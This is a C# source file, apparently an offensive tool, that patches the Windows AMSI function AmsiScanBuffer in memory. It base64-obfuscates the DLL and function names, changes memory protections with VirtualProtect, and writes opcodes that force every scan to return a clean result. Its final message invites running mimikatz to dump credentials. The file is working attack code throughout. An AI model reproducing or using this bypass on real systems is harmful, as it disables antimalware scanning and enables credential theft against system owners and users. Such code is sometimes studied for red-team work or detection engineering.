using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace AmBypass
{
    public class PatchTemplate
    {
        private static string decodeString(string encodedString) {
            string decodedString = Encoding.ASCII.GetString(Convert.FromBase64String(encodedString));
            return decodedString;
        }

        private static void patchAmFunction(Byte[] patchBytes, IntPtr Address)
        {
            Marshal.Copy(patchBytes, 0, Address, patchBytes.Length);    //patches the memory with the patch bytes supplied to return clean AMSI result after each AMSI scan.
        }

        private static byte[] getAmPatch
        {
            get
            {
                if (IntPtr.Size == 8)   //if true, it will return patch bytes for a 64-bit operating system. 
                {
                    return new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };   //these are the opcodes in the assembly 
                }
                else
                {
                    return new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
                }
            }
        }

        public static bool patchAmProtections() {
            try
            {
                string targetDllName = decodeString("YW1zaS5kbGw=");
                IntPtr targetLibrary = BaseAPIs.LoadLibrary(targetDllName); //loads amsi.dll

                string targetFunctionName = decodeString("QW1zaVNjYW5CdWZmZXI=");
                IntPtr targetProcessAddress = BaseAPIs.GetProcAddress(targetLibrary, targetFunctionName); //returns pointer to the address where AmsiScanBuffer
                                                                                                          //function is located in amsi.dl


                var patchBytes = getAmPatch; //get patch bytes for the target architecture

                BaseAPIs.MemoryProtection oldProtections;
                if (BaseAPIs.VirtualProtect(targetProcessAddress,
                    patchBytes.Length,
                    BaseAPIs.MemoryProtection.ExecuteReadWrite,
                    out oldProtections)) //If memory permissions can be changed then patch amsi
                {
                    patchAmFunction(patchBytes, targetProcessAddress); //patches the amsi.dll with new patch bytes.
                }

                BaseAPIs.MemoryProtection newProtections;
                BaseAPIs.VirtualProtect(targetProcessAddress, patchBytes.Length, oldProtections, out newProtections); //changes the memory permissions back to normal. 

                return true;
            }
            catch
            {
                return false;
            }
            
        }

        public static void Main() {
            try
            {
                var isPatched = patchAmProtections();
                if (isPatched)
                {
                    Console.WriteLine("Amsi patched.. Now you can run mimikatz to dump credentials");
                }
            }
            catch
            {
                Console.WriteLine("There were errors in patching AMSI");
            }
        }

    }
}
